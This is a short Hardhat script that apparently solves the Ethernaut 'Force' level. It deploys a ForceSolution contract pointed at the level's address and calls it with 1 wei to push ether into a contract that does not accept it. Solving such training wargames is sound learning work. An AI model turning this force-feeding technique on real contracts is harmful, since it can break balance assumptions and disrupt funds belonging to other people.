const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const forceContract = '0x9de4eFa4CB7c68c0F0A09761a67A75334Ecc1A96';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const ForceSolution = await ethers.getContractFactory('ForceSolution', deployer);
  const forceSolution = await ForceSolution.deploy(forceContract);

  await forceSolution.forceThem({ value: 1 });

  console.log('Forced');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
